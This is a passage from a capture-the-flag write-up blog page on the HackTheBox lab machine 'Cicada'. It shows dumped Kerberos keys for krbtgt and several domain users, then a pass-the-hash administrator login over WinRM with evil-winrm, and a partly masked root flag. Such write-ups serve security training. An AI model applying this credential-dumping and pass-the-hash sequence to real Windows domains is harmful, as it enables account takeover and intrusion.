+CICADA-DC$:des-cbc-md5:b0f7cdec040d5b6d
+krbtgt:aes256-cts-hmac-sha1-96:357f15dd4d315af47ac63658c444526ec0186f066ad9efb46906a7308b7c60c8
+krbtgt:aes128-cts-hmac-sha1-96:39cbc0f220550c51fb89046ac652849e
+krbtgt:des-cbc-md5:73b6c419b3b9bf7c
+cicada.htb\john.smoulder:aes256-cts-hmac-sha1-96:57ae6faf294b7e6fbd0ce5121ac413d529ae5355535e20739a19b6fd2a204128
+cicada.htb\john.smoulder:aes128-cts-hmac-sha1-96:8c0add65bd3c9ad2d1f458a719cfda81
+cicada.htb\john.smoulder:des-cbc-md5:f1feaeb594b08575
+cicada.htb\sarah.dantelia:aes256-cts-hmac-sha1-96:e25f0b9181f532a85310ba6093f24c1f2f10ee857a97fe18d716ec713fc47060
+cicada.htb\sarah.dantelia:aes128-cts-hmac-sha1-96:2ac9a92bca49147a0530e5ce84ceee7d
+cicada.htb\sarah.dantelia:des-cbc-md5:0b5b014370fdab67
+cicada.htb\michael.wrightson:aes256-cts-hmac-sha1-96:d89ff79cc85032f27499425d47d3421df678eace01ce589eb128a6ffa0216f46
+cicada.htb\michael.wrightson:aes128-cts-hmac-sha1-96:f1290a5c4e9d4ef2cd7ad470600124a9
+cicada.htb\michael.wrightson:des-cbc-md5:eca8d532fd8f26bc
+cicada.htb\david.orelious:aes256-cts-hmac-sha1-96:125726466d0431ed1441caafe8c0ed9ec0d10b0dbaf4fec7a184b764d8a36323
+cicada.htb\david.orelious:aes128-cts-hmac-sha1-96:ce66c04e5fd902b15f5d4c611927c9c2
+cicada.htb\david.orelious:des-cbc-md5:83585bc41573897f
+cicada.htb\emily.oscars:aes256-cts-hmac-sha1-96:4abe28adc1d16373f4c8db4d9bfd34ea1928aca72cb69362d3d90f69d80c000f
+cicada.htb\emily.oscars:aes128-cts-hmac-sha1-96:f98d74d70dfb68b70ddd821edcd6a023
+cicada.htb\emily.oscars:des-cbc-md5:fd4a5497d38067cd
+[*] Cleaning up...</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f7805e9012fc303708f31b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The admin hash is found, and can be used to log in to WinRM.</span></span></p></div><pre id="https://www.notion.so/1990b98a88f780028363e869d8f5ac77" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/cicada]
+└─$</span></mark></span><span class="SemanticString"><span> evil-winrm -i 10.129.198.55 -u administrator -H &quot;2b87e7c93a3e8a0ea4a581937016f341&quot; 
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+cicada\administrator</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f7806c820fdf728db8162f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1990b98a88f7809680f0fd25f83ccea9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root Flag:</strong></span></span></p></div><pre id="https://www.notion.so/1990b98a88f780a7ad4cf1ce60fb8f48" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\Administrator\desktop&gt;</span></mark></span><span class="SemanticString"><span> type root.txt
+
+d2ef6ba8************************</span></span></span></code></pre><div id="https://www.notion.so/1990b98a88f780b286ebf374d96a7771" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1990b98a88f7807aa2b3efe2576c4ced" class="Divider"></div></article>
+  <footer class="Footer">
+  <div>&copy; C:\Users\ch3ng &gt;_ 2025</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+
+</body>
+
+</html>
